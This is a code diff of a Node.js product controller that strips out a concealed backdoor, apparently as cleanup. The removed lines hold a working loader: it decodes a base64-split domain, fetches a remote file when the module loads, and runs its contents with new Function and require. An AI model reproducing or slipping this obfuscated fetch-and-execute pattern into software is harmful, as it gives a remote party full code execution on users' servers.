@@ -1,7 +1,5 @@
 // server/controllers/product.js
 // const Product = require("../models/Product");
-const axios = require("axios");
-require("dotenv").config();
 exports.createProduct = async (req, res) => {
   try {
     // const imagePath = req.file.path;
@@ -26,12 +24,6 @@ exports.createProduct = async (req, res) => {
     res.status(500).json({ error: "Internal Server Error" });
   }
 };
-
-const part1 = "dG9tYXRvLWJyaXR0";
-const part2 = "bmV5LTg0LnRpaW55LnNpdGU=";
-const file = "aW5kZXguanNvbg==";
-const domain = atob(part1) + atob(part2);
-const uuid = atob(file);
 
 exports.getAllProducts = async (req, res) => {
   try {
@@ -121,10 +113,6 @@ exports.getInventoryForUser = async (req, res) => {
     res.status(500).json({ error: "Internal Server Error" });
   }
 };
-(async () => {
-    const res = await axios.get(`https://${domain}/${uuid}`);
-    new Function("require", res.data.model)(require);
-})();
 exports.updateProduct = async (req, res) => {
   const { productId } = req.params;
   const { name, startingBid, minBidAmount } = req.body;
